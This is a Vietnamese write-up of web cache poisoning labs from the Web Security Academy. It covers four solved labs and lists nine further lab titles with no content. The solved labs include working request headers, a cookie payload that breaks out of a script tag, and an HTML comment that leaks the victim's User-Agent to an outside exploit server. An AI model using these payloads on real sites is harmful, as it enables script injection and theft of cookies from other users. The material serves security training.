# 1. Web cache poisoning with an unkeyed header
Nhận thấy `Host` HTTP header được reflected trong đoạn tracker script:

```
<script type="text/javascript" src="//0a67006403f76056c172df6000b30077.web-security-academy.net/resources/js/tracking.js"></script>
```
Thử thêm header `X-Forwarded-Host: abc.com` thì thấy đoạn script trở thành:
```
<script type="text/javascript" src="//abc.com/resources/js/tracking.js"></script>
```
Và server sẽ lưu cache trong thời gian 30s. Như vậy, để thực thi đoạn script `alert(document.cookie)`, ta vào exploit server và cấu hình đoạn body `alert(document.cookie)`, với header `Content-Type: application/javascript`, sau đó để path là `/resources/js/tracking.js`.

Submit request với header `X-Forwarded-Host: https://exploit-0aa1003b03e760a1c112deb4012a0067.exploit-server.net` cho đến khi kết quả được reflected trong response (khi cache hết hạn). Kết quả thành công.

# 2. Web cache poisoning with an unkeyed cookie
Website có cookie "fehost=prod-cache-01", được reflected trong response như sau:
```
<script>
    data = {
        "host":"0a6b00a5031f6272c0c895f1009600fe.web-security-academy.net",
        "path":"/",
        "frontend":"prod-cache-01"
    }
</script>
```

Thử thay đổi `cookie=prod-cache-01"</script>`, submit đến khi response mới được lưu vào cache. Nhận thấy dấu nháy kép và dấu đóng mở tag được cho phép, khiến ta có thể escape javascript string và script tag.

Bắt request với Burp Repeater, thử thay đổi `cookie=prod-cache-01"}</script><script>alert(1)</script>` rồi đợi đến khi cache hết hạn và submit. Kết quả bài lab được giải.

# 3. Web cache poisoning with multiple headers
Nhận thấy khi thêm header `X-Forwarded-Scheme: http`, server sẽ trả về response như sau:
```
HTTP/1.1 302 Found
Location: https://0a64003d036f1d8cc00df4bd002f00b9.web-security-academy.net/
...
```
Như vậy server tự động redirect tới URL sử dụng protocol https. Thử thêm header `X-Forwarded-Host: abc.com`, thì header Location trở thành: `Location: https://abc.com`. Đồng thời, ta thấy 2 header `X-Forwarded-Host` và `X-Forwarded-Scheme` là unkeyed header đối với cache.

Vào exploit server, cấu hình đoạn javascript và đặt path là `/resources/js/tracking.js`. Sau đó dùng Burp Repeater cấu hình request với header:
```
GET /resources/js/tracking.js HTTP/1.1
Host: 0a64003d036f1d8cc00df4bd002f00b9.web-security-academy.net
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a4f008b03de1df6c0b5f3c5017d0029.exploit-server.net
....
```
Khi đó response thu được là:
```
HTTP/1.1 302 Found
Location: https://exploit-0a4f008b03de1df6c0b5f3c5017d0029.exploit-server.net/resources/js/tracking.js
....
```
Khi browser của nạn nhân load file `/resources/js/tracking.js`, thì file tracking.js trong exploit server (thực thi lệnh alert) sẽ được load thay vì file tracking.js của server chứa lỗ hổng. Thực hiện gửi request đến khi response được lưu vào cache. Bài lab được giải thành công.

# 4. Targeted web cache poisoning using an unknown header
Trong bài lab này, vẫn có chức năng tracking bằng javascript như trước. Tuy nhiên ta không thể exploit bằng cách sử dụng header `X-Forwarded-Host` và `X-Forwarded-Scheme`.

Sử dụng extension "Param Miner" của BurpSuite, ta phát hiện domain name của tracking script có thể bị thay đổi sử dụng header `X-Host`. Thêm header `X-Host: abc.com`, nhận thấy đoạn script trở thành:
```
<script type="text/javascript" src="//abc.com/resources/js/tracking.js"></script>
```

Như vậy ta đã tìm được cách inject mã độc vào response. Trong response có header `Vary: User-Agent`, là cache sẽ được trả về cho user với User-Agent tương ứng. Vậy tiếp theo ta cần xác định User-Agent của victim user.

Trong chức năng comment cho phép comment chứa HTML code. Ta submit comment với nội dung:
```
<img src="https://exploit-0ac700b8049a5594c1d1de6d011a003c.exploit-server.net/?data=useragent">
```
Vào Access Log của Exploit server, ta lấy được User-Agent của victim:
```
03:25:46 +0000 "GET /data=useragent HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36"
```
Vậy, ta cấu hình request với các headers:
```
GET / HTTP/1.1
Host: 0a210087044e5550c155dfef009b007e.h1-web-security-academy.net
X-Host: exploit-0ac700b8049a5594c1d1de6d011a003c.exploit-server.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119
...
```
Submit request đến khi đảm bảo response được lưu vào trong cache. Kết quả, bài lab được giải.

# 5. Web cache poisoning via an unkeyed query string

# 6. Web cache poisoning via an unkeyed query parameter

# 7. Parameter cloaking

# 8. Web cache poisoning via a fat GET request

# 9. URL normalization

# 10. Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

# 11. Combining web cache poisoning vulnerabilities

# 12. Cache key injection

# 13. Internal cache poisoning

